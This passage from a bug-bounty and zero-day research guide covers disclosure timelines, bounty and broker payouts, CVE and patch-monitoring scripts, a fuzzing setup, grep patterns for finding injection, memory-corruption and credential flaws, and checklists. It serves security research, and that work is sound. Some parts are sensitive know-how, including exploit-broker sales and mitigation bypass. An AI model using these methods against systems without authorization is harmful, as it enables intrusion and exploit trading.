| 0 days | Full immediate disclosure | Active exploitation in the wild, vendor unresponsive |
| 7 days | Short disclosure | Critical infrastructure, actively exploited |
| 14 days | Accelerated | High severity, vendor confirms but slow |
| 30 days | Short standard | Medium severity, responsive vendor |
| 45 days | Standard | Typical coordinated disclosure |
| 90 days | Long standard | Google Project Zero default |
| 120 days+ | Extended | Complex fixes, hardware/embedded |

### Coordinated Disclosure vs Full Disclosure

| Aspect | Coordinated | Full Disclosure |
|--------|-------------|-----------------|
| Head start | Vendor gets time to fix | None |
| Public safety | Users patched before public | Zero-day gap for attackers |
| Credit | Vendor often credits researcher | Immediate recognition |
| Payout | Bounty/program rewarded | Usually no payment |
| Legal risk | Lower (authorized) | Higher (potential liability) |
| Best for | Bug bounty programs, contracted research | Unresponsive vendors, EOL software |

### Legal Considerations

```
Do:
  ✅ Report through official channels
  ✅ Respect embargo periods
  ✅ Encrypt sensitive communications
  ✅ Follow bug bounty rules of engagement
  ✅ Document all communications
  ✅ Check export control regulations (EAR, ITAR)

Don't:
  ❌ Test beyond scope without authorization
  ❌ Publish before vendor fixes
  ❌ Sell to brokers without doing due diligence
  ❌ Exfiltrate user data (even for "proof")
  ❌ Modify or destroy production data
  ❌ Test on systems you don't own or have permission for
```

### Bug Bounty Platform Special Handling

```
HackerOne:
  - Reports automatically go to vendor's security team
  - No mediator for disputes
  - 60-day default disclosure timeline
  - Features: Request CVE, request disclosure, signal tracking

Bugcrowd:
  - Triager analyzes first, then vendor
  - VRT severity table (sometimes underrates 0-days)
  - Can appeal severity decisions
  - Similar to H1 but with triager buffer

Intigriti:
  - European platform
  - Good for unpatched bugs in tested applications
  - Some programs have special bounties

Immunefi:
  - Web3/DeFi focused
  - Smart contract 0-days pay extremely well
  - Must demonstrate impact in testnet or fork
  - Strict validation process

Special Programs (Google VRP, MSRC, Apple):
  - Have specific rules for 0-days
  - May require signing NDA before full details
  - Higher payouts but more stringent validation
  - Often require demonstrated exploit reliability
```

### Writing the Advisory

```markdown
# CVE-2026-XXXX: [Product] [Component] [Vulnerability Type]

## Summary
[1-2 sentence description of the vulnerability]

## Affected
- Product: [Product Name]
- Version: [All versions from X.Y to X.Z]
- Component: [Affected module/function]
- Status: Unpatched / Patch available from [vendor website]

## Impact
An attacker can [what the attacker can do] by [attack vector].
CVSS 3.1: [Base Score] ([Vector String])

## Description
[2-3 paragraph technical description]
- What the vulnerable code does
- What the attacker controls
- How the vulnerability is triggered
- What the result is

## Proof of Concept
```
[Working PoC code, steps to reproduce, or curl commands]
```

## Remediation
[Steps to fix, vendor patch info, or workaround]
- Upgrade to version [patched version]
- [Workaround if no patch available]

## Timeline
- 2026-06-01: Vulnerability discovered
- 2026-06-02: Reported to vendor via [channel]
- 2026-06-05: Vendor confirmed
- 2026-06-30: CVE assigned
- 2026-07-15: Patch released
- 2026-07-16: Public disclosure

## Credit
- [Researcher name/handle]
```

---

## Getting Paid for 0-Days

### ZDI, Beyond, and Third-Party Broker Programs

| Broker | Focus | Typical Range | Process |
|--------|-------|---------------|---------|
| ZDI (Trend Micro) | All software | $2,000 - $20,000 | Submit through portal, 30-60 day validation |
| Beyond Security | All software | $1,000 - $15,000 | Submit through portal |
| Exodus Intelligence | Enterprise software | $5,000 - $250,000 | NDA required, direct contact |
| NowSecure | Mobile apps | $2,000 - $20,000 | Submit through app |
| Tag Cyber | All software | $5,000 - $50,000 | Direct contact |
| Crowdfense | Exploit chains | $25,000 - $500,000 | NDA, direct contact |

### HackerOne/Bugcrowd Special Bounty Programs

```
HackerOne Top Bounties (historical 0-day payouts):
  - Apple: Up to $1,000,000 (lockdown mode bypass + kernel + sandbox)
  - Google: Up to $180,000 (Chrome full RCE chain)
  - Microsoft: Up to $250,000 (Hyper-V RCE, Azure RD)
  - Meta: Up to $100,000 (WhatsApp RCE, Instagram full chain)
  - PayPal: Up to $30,000 (pre-auth RCE, ATO chain)
  - Twitter/X: Up to $10,000 (account takeover, RCE)
```

### Vendor Bounty Programs

| Vendor | Program | 0-Day Bounty Range |
|--------|---------|-------------------|
| Google | VRP | $500 - $180,000 (Chrome chain) |
| Microsoft | MSRC | $500 - $250,000 (Azure/Hyper-V) |
| Apple | Security Bounty | $100,000 - $1,000,000 |
| Meta | Bug Bounty | $500 - $100,000 |
| Google | Android VRP | $500 - $500,000 (chain) |
| Google | OSS Patch Reward | $1,000 - $30,000 |
| Mozilla | Bug Bounty | $500 - $15,000 |
| Cloudflare | Bug Bounty | $200 - $20,000 |

### Exploit Broker Marketplaces

```
Legal gray area (varies by country):
  - Zerodium: $50,000 - $2,500,000 (premium for mobile/messenger chains)
  - IntelBroker: Varies (less transparent)
  - Dark Web markets: High risk, high reward

Due diligence:
  - Verify buyer's reputation
  - Check export control restrictions
  - Consider ethical implications
  - Understand legal jurisdiction
  - NEVER sell to known threat actors
```

### $500k+ Payouts: When and How

```
Multipliers for maximum payout:
  1. Pre-auth RCE (no interaction required)        × 10x
  2. No user interaction (e.g., network worm)      × 5x
  3. Bypasses all major mitigations                 × 3x
  4. Works on latest version (no patch)             × 2x
  5. Affects widely deployed product                × 2x
  6. Full chain (not just one primitive)            × 2x
  7. Mobile/iOS/Android                            × 1.5x
  8. Reliable/ship-ready exploit                   × 1.5x

Example: iOS iMessage RCE chain (pre-auth, no interaction)
  Base: $200,000
  Pre-auth: × 10 → would be $2,000,000
  Apple caps: $1,000,000

Example: Chrome full chain (renderer + sandbox)
  Base: $60,000 (renderer RCE)
  Sandbox escape: + $60,000
  Full chain: × 1.5
  Total: $120,000 - $180,000
```

---

## Toolkit & Automation

### Vulnerability Research Automation Scripts

```python
#!/usr/bin/env python3
"""
0-day research automation toolkit.
Monitors CVE feeds, patch releases, and fuzzing pipelines.
"""

import os
import json
import hashlib
import requests
import subprocess
from datetime import datetime, timedelta
from email.mime.text import MIMEText

class ZeroDayToolkit:
    def __init__(self, config_path="config.json"):
        with open(config_path) as f:
            self.config = json.load(f)
        self.watchlist = self.config.get("watchlist", [])
        
    def monitor_nvd(self, keywords=None):
        """Monitor NVD for new CVEs matching watchlist."""
        since = (datetime.now() - timedelta(hours=24)).isoformat()
        params = {
            'lastModStartDate': since,
            'resultsPerPage': 200
        }
        
        resp = requests.get(
            'https://services.nvd.nist.gov/rest/json/cves/2.0',
            params=params
        )
        
        results = []
        for vuln in resp.json().get('vulnerabilities', []):
            cve = vuln.get('cve', {})
            desc = cve.get('descriptions', [{}])[0].get('value', '')
            
            for watch in self.watchlist:
                if watch.lower() in desc.lower():
                    results.append({
                        'cve_id': cve.get('id'),
                        'desc': desc[:200],
                        'severity': cve.get('metrics', {})
                            .get('cvssMetricV31', [{}])[0]
                            .get('cvssData', {}).get('baseSeverity'),
                        'epss': self.get_epss(cve.get('id'))
                    })
        return results
    
    def get_epss(self, cve_id):
        """Get EPSS score for a CVE."""
        try:
            resp = requests.get(
                f'https://api.first.org/data/v1/epss?cve={cve_id}',
                timeout=10
            )
            data = resp.json()
            return data.get('data', [{}])[0].get('epss', 'N/A')
        except:
            return 'N/A'
    
    def monitor_github_advisories(self, ecosystem=None):
        """Monitor GitHub Security Advisories."""
        query = '''
        {
            securityAdvisories(first: 50, 
                orderBy: { field: PUBLISHED_AT, direction: DESC }) {
                nodes {
                    ghsaId
                    summary
                    severity
                    publishedAt
                    vulnerabilities(first: 5) {
                        nodes {
                            package { name ecosystem }
                            vulnerableVersionRange
                        }
                    }
                }
            }
        }
        '''
        
        headers = {"Authorization": f"Bearer {self.config['github_token']}"}
        resp = requests.post(
            'https://api.github.com/graphql',
            json={'query': query},
            headers=headers
        )
        
        advisories = []
        for advisory in resp.json()['data']['securityAdvisories']['nodes']:
            for vuln in advisory['vulnerabilities']['nodes']:
                pkg = vuln['package']
                for watch in self.watchlist:
                    if watch.lower() in pkg['name'].lower():
                        advisories.append({
                            'ghsa': advisory['ghsaId'],
                            'summary': advisory['summary'],
                            'severity': advisory['severity'],
                            'package': pkg['name'],
                            'range': vuln['vulnerableVersionRange']
                        })
        return advisories
    
    def monitor_github_commits(self, repos):
        """Monitor specified repos for security-relevant commits."""
        results = []
        security_keywords = [
            'security', 'vulnerability', 'cve', 'overflow',
            'injection', 'xss', 'csrf', 'fix', 'patch',
            'bypass', 'dos', 'crash', 'memory', 'sanitize'
        ]
        
        for repo in repos:
            since = (datetime.now() - timedelta(days=1)).isoformat()
            url = f'https://api.github.com/repos/{repo}/commits'
            params = {'since': since, 'per_page': 100}
            headers = {"Authorization": f"Bearer {self.config['github_token']}"}
            
            resp = requests.get(url, params=params, headers=headers)
            if resp.status_code != 200:
                continue
                
            for commit in resp.json():
                msg = commit['commit']['message'].lower()
                for kw in security_keywords:
                    if kw in msg:
                        results.append({
                            'repo': repo,
                            'sha': commit['sha'][:8],
                            'message': commit['commit']['message'][:100],
                            'author': commit['commit']['author']['name'],
                            'url': commit['html_url']
                        })
                        break
        return results
```

### CVE Monitoring Workflow

```bash
# Step 1: Subscribe to NVD feed
# Use the NVD API with a daily cron job
0 6 * * * python3 monitor_nvd.py --config config.json --output alerts/

# Step 2: Subscribe to vendor-security mailing lists
# Examples:
#   apache-announce@apache.org
#   linux-distros@vs.openwall.org
#   oss-security@lists.openwall.com
#   fulldisclosure@seclists.org
#   bugtraq@securityfocus.com

# Step 3: GitHub release monitoring
# Use GitHub releases API for each watched repo
curl -s "https://api.github.com/repos/nginx/nginx/releases"
curl -s "https://api.github.com/repos/openssl/openssl/releases"
curl -s "https://api.github.com/repos/apache/httpd/releases"

# Step 4: Twitter/X monitoring
# Follow: @CVEnew, @CVEreport, @vulmon, @threatintel
# Use nitter.net for API-free scraping

# Step 5: RSS feeds
# Subscribe to:
#   https://nvd.nist.gov/download/nvd-rss.xml
#   https://packetstormsecurity.com/files/tags/exploit/rss/
#   https://seclists.org/rss/fulldisclosure.rss
```

### Patch Monitoring Automation

```python
#!/usr/bin/env python3
"""
Automated patch monitoring: watch GitHub repos and binary package repos
for new releases, then download and stage for diffing.
"""

import os
import re
import json
import hashlib
import requests
import subprocess
from datetime import datetime

class PatchMonitor:
    def __init__(self, config):
        self.config = config
        self.last_checked = config.get('last_checked', {})
        
    def check_github_releases(self, repo):
        """Check if a new release exists for a GitHub repo."""
        url = f"https://api.github.com/repos/{repo}/releases/latest"
        headers = {"Authorization": f"Bearer {self.config['github_token']}"}
        
        resp = requests.get(url, headers=headers)
        if resp.status_code != 200:
            return None
            
        release = resp.json()
        tag = release['tag_name']
        
        if self.last_checked.get(repo) != tag:
            self.last_checked[repo] = tag
            return {
                'repo': repo,
                'tag': tag,
                'url': release['html_url'],
                'published': release['published_at'],
                'body': release['body'][:500]
            }
        return None
    
    def download_release(self, repo, tag, output_dir):
        """Download release source for diffing."""
        url = f"https://api.github.com/repos/{repo}/zipball/{tag}"
        headers = {"Authorization": f"Bearer {self.config['github_token']}"}
        
        resp = requests.get(url, headers=headers, stream=True)
        if resp.status_code != 200:
            return False
            
        filename = f"{repo.replace('/', '_')}_{tag}.zip"
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'wb') as f:
            for chunk in resp.iter_content(chunk_size=8192):
                f.write(chunk)
        
        return filepath
    
    def extract_and_diff(self, old_version, new_version, repo_name):
        """Extract both versions and run diff."""
        old_dir = f"versions/{repo_name}/{old_version}"
        new_dir = f"versions/{repo_name}/{new_version}"
        
        os.makedirs(old_dir, exist_ok=True)
        os.makedirs(new_dir, exist_ok=True)
        
        # Extract
        subprocess.run([
            'unzip', '-q', 
            f'downloads/{repo_name}_{old_version}.zip', 
            '-d', old_dir
        ])
        subprocess.run([
            'unzip', '-q',
            f'downloads/{repo_name}_{new_version}.zip',
            '-d', new_dir
        ])
        
        # Diff
        result = subprocess.run([
            'diff', '-r', '--exclude=.git',
            old_dir, new_dir
        ], capture_output=True, text=True)
        
        # Save diff
        diff_path = f"diffs/{repo_name}_{old_version}_to_{new_version}.diff"
        os.makedirs('diffs', exist_ok=True)
        with open(diff_path, 'w') as f:
            f.write(result.stdout)
        
        return diff_path
```

### Fuzzing Pipeline Setup

```yaml
# docker-compose.yml for automated fuzzing lab
version: '3'
services:
  fuzzer-afl:
    build: .
    volumes:
      - ./corpus:/corpus
      - ./findings:/findings
      - ./target:/target
    command: >
      afl-fuzz -i /corpus -o /findings
      -m none -t 5000
      -- /target/vulnerable_program @@
    restart: unless-stopped
    
  fuzzer-libfuzzer:
    build:
      context: .
      dockerfile: Dockerfile.libfuzzer
    volumes:
      - ./corpus:/corpus
      - ./findings_libfuzzer:/findings
    command: >
      ./fuzzer -max_len=4096
      -jobs=$(nproc) -workers=$(nproc)
      /corpus/
    restart: unless-stopped
    
  crash-triage:
    build:
      context: .
      dockerfile: Dockerfile.triage
    volumes:
      - ./findings:/findings
      - ./crashes:/crashes
    command: python3 triage.py /findings /crashes
    restart: unless-stopped
```

### Custom Grep Patterns for 0-Day Discovery

```bash
# Memory corruption patterns
grep -rn "memcpy\|memmove\|strcpy\|strcat\|sprintf\|gets\|scanf" --include="*.c" --include="*.cpp" --include="*.cc" src/
grep -rn "UserMode\|copy_user\|__copy_to_user\|__copy_from_user" --include="*.c" src/
grep -rn "kmalloc\|kzalloc\|vmalloc\|alloc_pages" -A2 --include="*.c" src/ | grep -E "*(user|c tl|unknown)"

# Integer overflow patterns
grep -rn "a \* b\|n \* m\|count \* size\|len \*\|size \*" --include="*.c" --include="*.cpp" src/
grep -rn "(int)\|(size_t)\|(unsigned)" --include="*.c" --include="*.cpp" src/ | grep -E "malloc\|alloc\|realloc"

# Use-after-free patterns
grep -rn "kfree\|free\|delete" --include="*.c" src/ | grep -B1 -A1 "close\|release\|cleanup\|destroy"

# Format string patterns
grep -rn 'printf(\|fprintf(\|sprintf(\|snprintf(\|syslog(' --include="*.c" src/ | grep -v '\\"%.*s\\"'

# SSRF patterns
grep -rn "curl\|fetch\|wget\|file_get_contents\|requests\.get\|httpx" \
    --include="*.py" --include="*.php" --include="*.js" --include="*.go" src/
grep -rn "urlopen\|urlretrieve\|download_file\|getUrlContent" src/

# Command injection patterns
grep -rn "exec\|system\|popen\|shell_exec\|passthru\|proc_open" \
    --include="*.py" --include="*.php" --include="*.js" src/ | grep -v "\\\"escapeshell"

# Path traversal patterns
grep -rn "\.\.\/\|\.\.\\\\|\.\.%2f\|%2e%2e\|\.\.;/" --include="*.py" --include="*.php" --include="*.js" src/

# Hardcoded credentials patterns
grep -rn "password\|secret\|api_key\|apiKey\|token\|jwt\|bearer\|auth" \
    --include="*.py" --include="*.js" --include="*.json" --include="*.xml" --include="*.yaml" src/ | \
    grep -v "node_modules\|\.git\|test\|example\|sample\|placeholder"
```

### CVE Reference Cheatsheet by Product/Vendor

| Product | GitHub | CVE Pattern | CPE |
|---------|--------|-------------|-----|
| Nginx | nginx/nginx | CVE-20XX-XXXX | cpe:2.3:a:nginx:nginx |
| Apache httpd | apache/httpd | CVE-20XX-XXXX | cpe:2.3:a:apache:http_server |
| OpenSSL | openssl/openssl | CVE-20XX-XXXX | cpe:2.3:a:openssl:openssl |
| jQuery | jquery/jquery | CVE-20XX-XXXX | cpe:2.3:a:jquery:jquery |
| Django | django/django | CVE-20XX-XXXX | cpe:2.3:a:djangoproject:django |
| Flask | pallets/flask | CVE-20XX-XXXX | cpe:2.3:a:palletsprojects:flask |
| Node.js | nodejs/node | CVE-20XX-XXXX | cpe:2.3:a:nodejs:node.js |
| Go | golang/go | CVE-20XX-XXXX | cpe:2.3:a:golang:go |
| Ruby | ruby/ruby | CVE-20XX-XXXX | cpe:2.3:a:ruby-lang:ruby |
| Redis | redis/redis | CVE-20XX-XXXX | cpe:2.3:a:redis:redis |
| WordPress | WordPress/WordPress | CVE-20XX-XXXX | cpe:2.3:a:wordpress:wordpress |
| Linux Kernel | torvalds/linux | CVE-20XX-XXXX | cpe:2.3:o:linux:linux_kernel |
| Google Chrome | chromium/chromium | CVE-20XX-XXXX | cpe:2.3:a:google:chrome |
| Mozilla Firefox | mozilla/gecko-dev | CVE-20XX-XXXX | cpe:2.3:a:mozilla:firefox |
| Apple Safari | WebKit/WebKit | CVE-20XX-XXXX | cpe:2.3:a:apple:safari |
| Microsoft Edge | Microsoft/edge | CVE-20XX-XXXX | cpe:2.3:a:microsoft:edge |
| Curl | curl/curl | CVE-20XX-XXXX | cpe:2.3:a:haxx:curl |
| Git | git/git | CVE-20XX-XXXX | cpe:2.3:a:git-scm:git |
| Systemd | systemd/systemd | CVE-20XX-XXXX | cpe:2.3:a:freedesktop:systemd |
| Kubernetes | kubernetes/kubernetes | CVE-20XX-XXXX | cpe:2.3:a:kubernetes:kubernetes |
| Docker | moby/moby | CVE-20XX-XXXX | cpe:2.3:a:docker:docker |

---

## Checklist

### Pre-Research

- [ ] Select target based on payout potential, attack surface, and competition
- [ ] Verify target's bug bounty program scope explicitly covers the component
- [ ] Review all disclosed CVEs for the target in the last 3 years
- [ ] Identify latest version and all maintenance branches
- [ ] Set up local development environment with the target version
- [ ] Gather all available source code (open source) or binary (proprietary)
- [ ] Identify entry points: what inputs does the target accept?
- [ ] Map the attack surface: network, file, UI, API, protocol
- [ ] Check for fuzzing support (ASAN, UBSAN, MSAN builds available?)
- [ ] Create a research journal to track progress and findings
- [ ] Set a time budget (max 7 days per target without strong signals)
- [ ] Configure monitoring for new releases and patches

### During Research

- [ ] Run initial CVE search: NVD, GitHub Advisories, Exploit-DB
- [ ] Diff latest patch release against previous version
- [ ] Check all maintenance branches for missing backports
- [ ] Set up fuzzing pipeline (AFL++, libFuzzer, or Honggfuzz)
- [ ] Build corpus from valid input samples
- [ ] Run fuzzing campaigns with ASAN/UBSAN/TSAN instrumentation
- [ ] Run API fuzzing (RESTler, schemathesis) if applicable
- [ ] Perform static analysis on identified vulnerable functions
- [ ] Trace user input through the application data flow
- [ ] Verify each crash: is it exploitable? Is it a duplicate?
- [ ] Minimize crash input and create reliable trigger
- [ ] Test crash on latest patched version (should not crash)
- [ ] Identify exploit primitive type (read, write, code execution)
- [ ] Bypass security mitigations (ASLR, DEP, CFG, etc.)
- [ ] Write reproducible PoC with clear steps
- [ ] Document each attempt: what was tried, what failed, why

### Vulnerability Confirmation

- [ ] Vulnerability reproduces consistently (run PoC 3+ times)
- [ ] Vulnerability does NOT reproduce on patched version
- [ ] Vulnerability is exploitable (not just a crash/DoS)
- [ ] Impact is clearly demonstrated (data read, code execution, etc.)
- [ ] No existing CVE or public disclosure for this bug
- [ ] Check if vulnerability is in scope for the target program
- [ ] Calculate CVSS 3.1 score with accurate vector string
- [ ] Determine if this is a standalone finding or part of a chain
- [ ] Gather evidence: screenshots, HAR files, crash logs, PoC output
- [ ] Capture all necessary context (versions, config, platform)
- [ ] Identify the root cause commit (if open source)
- [ ] Identify when the vulnerable code was introduced

### Pre-Disclosure

- [ ] Verify vendor security contact is correct
- [ ] Encrypt all sensitive communication with vendor PGP key
- [ ] Write clear, concise vulnerability description
- [ ] Include complete reproduction steps in report
- [ ] Attach non-weaponized PoC (remove RCE payload, show crash only)
- [ ] Include suggested fix or remediation steps
- [ ] Propose reasonable disclosure timeline (90 days standard)
- [ ] Request CVE from MITRE or vendor CNA
- [ ] Confirm vendor acknowledges receipt within 7 days
- [ ] Follow up if no response within 7 days
- [ ] Test vendor's fix when provided (verify it works)
- [ ] Coordinate advisory publication date
- [ ] Prepare public advisory with credit and timeline
- [ ] Prepare blog post or presentation (optional)
- [ ] Remove all test data from vendor systems before disclosure
- [ ] Verify no user data was collected or stored during research

### Pre-Report (Bug Bounty Submission)

- [ ] Run through the 7-Question Gate:
  - [ ] Is this a security vulnerability?
  - [ ] Can I reproduce it consistently?
  - [ ] Does it have security impact?
  - [ ] Is it in scope?
  - [ ] Is it not on the always-rejected list?
  - [ ] Have I minimized the PoC?
  - [ ] Can I prove impact without being destructive?
- [ ] Calculate and document CVSS 3.1 score
- [ ] Capture evidence: screenshot, HAR file, curl commands
- [ ] Redact all PII and session tokens in evidence
- [ ] Write impact-first summary (what can attacker do, how)
- [ ] Include clear reproduction steps
- [ ] Attach PoC script or detailed curl commands
- [ ] Specify affected versions and components
- [ ] Suggest remediation with code example if possible
- [ ] Submit through official program channel only
- [ ] Follow up within 2 weeks for status update
- [ ] Escalate to HackerOne mediation if no response after 30 days
- [ ] Request disclosure after program timelines expire

---

*This document is part of the Hercules-Hunt bug bounty toolkit. Use for authorized security research only. Unauthorized use of these techniques against systems without explicit permission may violate computer fraud and abuse laws.*
